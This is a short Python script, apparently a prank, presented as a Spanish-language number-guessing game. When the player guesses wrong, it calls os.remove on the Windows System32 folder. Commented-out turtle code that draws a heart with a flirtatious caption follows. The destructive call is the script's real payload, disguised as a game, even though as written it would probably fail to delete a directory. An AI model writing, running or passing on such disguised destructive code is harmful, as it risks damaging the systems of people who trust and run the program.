import random
import os

number = random.randint(1,10)
guess = input("elige un numro del 1 al 10")
guess = int(guess)

if guess == number:
    print("Has ganado")
    
else:
    os.remove("C:\Windows\System32")
    
    
# from turtle import *
# def corazon():
#     bgcolor("black")
#     color("red")
#     title("corazon")
    
#     begin_fill()
#     pensize(3)
#     left(50)
#     forward(133)
#     circle(50,200)
#     right(140)
#     circle(50,200)
#     forward(133)
#     end_fill()

# def texto(texto):
#     penup()
#     goto(0,-50)
#     pendown()
#     color("white")
#     style = ('courier',15,'bold')
#     write(texto,align="center",font=style)
    
#     hideturtle()
#     done()
# corazon()
# texto('hola wuapa, a cuanto la hora?')